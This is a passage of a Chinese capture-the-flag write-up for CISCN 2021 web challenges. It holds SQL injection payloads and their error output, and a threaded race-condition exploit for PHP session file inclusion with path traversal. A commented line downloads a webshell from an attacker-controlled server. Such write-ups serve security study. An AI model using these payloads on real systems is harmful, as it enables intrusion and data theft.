        &lt;span class=&#34;n&#34;&gt;hexchar&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;1&amp;#39;) or (select 1,&amp;#39;NO&amp;#39;,&amp;#39;CISCN{JGHHS-JPD52-IJK4O-MGPDZ-DUFWI-&amp;#39;)&amp;gt;=(select * from security.flag limit 1)#&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hexchar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uname&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;passwd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;text&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;login&amp;lt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;到最后卡住了，换了无列名注入报错爆列名，然后直接报错注入：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gitee.com/leonsec/images/raw/master/image-20210515131951311.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;admin&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;)||extractvalue(1,concat(0x7e,(select * from (select * from flag as a join (select * from flag)b using(id,no))c)))#
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;//Duplicate column name &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e0f1d955&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bbba&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;43&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b078&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a81b3fc4bf28&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;admin&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;extractvalue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e0f1d955&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bbba&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;43&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b078&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a81b3fc4bf28&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;security&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;#&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;XPATH&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;syntax&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;~CISCN{JgHhs-jpd52-iJk4O-MGPDz-d&amp;#39;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;admin&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;)||(extractvalue(1,concat(0x7e,substr((select `e0f1d955-bbba-43c3-b078-a81b3fc4bf28` from security.flag),32,50),0x7e)))#
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;//XPATH syntax error: &amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uFWI&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;CISCN{JgHhs-jpd52-iJk4O-MGPDz-duFWI-}&lt;/p&gt;
&lt;h3 id=&#34;middle_source&#34;&gt;middle_source&lt;/h3&gt;
&lt;p&gt;首页给了任意文件包含&lt;/p&gt;
&lt;p&gt;扫目录得到&lt;code&gt;.listing&lt;/code&gt;，得到&lt;code&gt;you_can_seeeeeeee_me.php&lt;/code&gt;是phpinfo页面&lt;/p&gt;
&lt;p&gt;有了phpinfo可以尝试直接向phpinfo页面传文件加垃圾数据，同时从phpinfo获取临时文件名进行文件包含，或者利用&lt;code&gt;session.upload_progress&lt;/code&gt;进行session文件包含&lt;/p&gt;
&lt;p&gt;前者尝试无效果&lt;/p&gt;
&lt;p&gt;从phpinfo得到了session保存路径：&lt;code&gt;/var/lib/php/sessions/fccecfeaje/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;尝试发现可以出网，虽然ban了很多函数，但是可以直接用copy或file_get_contents下载shell&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;/etc/acfffacfch/iabhcgedde/facafcfjgf/adeejdbegg/fdceiadhce/fl444444g&lt;/code&gt;发现flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gitee.com/leonsec/images/raw/master/image-20210515185821338.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;threading&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;#file_content = &amp;#39;&amp;lt;?php print_r(scandir(&amp;#34;/etc&amp;#34;));?&amp;gt;&amp;#39;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#file_content = &amp;#39;&amp;lt;?php copy(&amp;#34;http://myvps/s.txt&amp;#34;,&amp;#34;/tmp/leon.php&amp;#34;);echo &amp;#34;666666666&amp;#34;;?&amp;gt;&amp;#39;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#s.txt是shell一句话&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;file_content&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;?php var_dump(file_get_contents(&amp;#34;/etc/acfffacfch/iabhcgedde/facafcfjgf/adeejdbegg/fdceiadhce/fl444444g&amp;#34;));?&amp;gt;&amp;#39;&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;http://124.70.35.238:23579/&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;nb&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;upload&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;?php echo 999;?&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;file_content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;image/jpeg&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;PHP_SESSION_UPLOAD_PROGRESS&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file_content&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;Cookie&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;PHPSESSID=1234&amp;#39;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;READ&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wait&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://124.70.35.238:23579/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;cf&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;../../../../../../../../../../var/lib/php/sessions/fccecfeaje/sess_1234&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2230&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;[+]retry&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;clear&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;threading&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Event&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;threading&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Thread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;threading&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Thread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;threading&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Thread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;threading&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Thread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;READ&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;threading&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Thread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;READ&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;threading&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Thread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;READ&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://gitee.com/leonsec/images/raw/master/image-20210515185737528.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;CISCN{yo19m-ZqNC1-URusV-u83jg-zxqpZ-}&lt;/p&gt;
&lt;h3 id=&#34;upload&#34;&gt;upload&lt;/h3&gt;
&lt;p&gt;这道题收卷的时候没做出来，有点可惜&lt;/p&gt;
&lt;p&gt;访问题目就有源码&lt;/p&gt;
&lt;p&gt;index.php&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ctf&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ctf&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$ctf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ctf&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ctf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;upload&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
